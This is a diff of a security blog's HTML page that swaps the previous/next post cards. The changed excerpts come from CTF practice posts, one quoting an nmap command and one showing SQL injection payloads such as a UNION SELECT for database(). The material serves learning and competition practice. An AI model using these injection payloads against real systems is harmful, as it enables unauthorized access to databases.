-        id: '2021-10-20T23-18-30',
+        id: '2022-06-12T19-03-24',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1295,52 +1047,49 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/11/03/yi-ci-mou-ping-tai-shang-mian-de-ti-mu-jie-ti-guo-cheng/">
+                <a href="/2022/06/12/2022-06-12/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="一次某平台上面的题目解题过程">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="2022-6-12">
                         
-                        <span class="card-title">一次某平台上面的题目解题过程</span>
+                        <span class="card-title">2022-6-12</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            任务一：namp扫描测试
-1.在本地PC渗透测试平台Kali中使用nmap工具查看本地路由与接口,并将该操作使用的全部命令作为FLAG提交；
-
-​        nmap --iflist 172.16.101.250  
-
-
-2.通过本地
+                            网安路漫漫，愿与君同行。
+　　正如《纪念》歌中提起的，“时间一转眼就过去了三年一切在我心里开的好皎洁，现在倒计时也不剩几天。”，忆起大学三年恍如昨日一般，记得19年初入校园的那日，我并没有跟别的同学初入大学的那种喜悦之情。我有的只是一股不知
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-06-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
-                                    -web渗透
+                            <a href="/categories/%E6%9D%82%E8%AE%B0/" class="post-category">
+                                    -杂记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">-web渗透</span>
+                    <a href="/tags/%E6%9D%82%E8%AE%B0/">
+                        <span class="chip bg-color">-杂记</span>
                     </a>
                     
                 </div>
@@ -1354,25 +1103,35 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/10/ctf-lian-xi/">
+                <a href="/2022/05/30/bi-sai-poc/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="加油！">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="比赛poc">
                         
-                        <span class="card-title">加油！</span>
+                        <span class="card-title">比赛poc</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            网安路漫漫，愿与君同行00x1就我自己所参加或者了解的各类安全赛事来说，学了安全你会发现你什么都要去了解，或者是什么都要去懂，尝试安全类型的比赛都是刷下面的这题库里面的题目，如果几大题目全部刷完，打我们这种类型的比赛随便打。
-00x2我给大
+                            webweb1robots.txt协议
+
+
+web2简单sql注入
+先查看有几个字段
+1’ order by 4#
+
+联合查询，查数据库
+?id=-1’ union select 1,2,3,database()#
+
+联合查询数据库的表
+i
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-30
                             </span>
                         <span class="publish-author">
                             
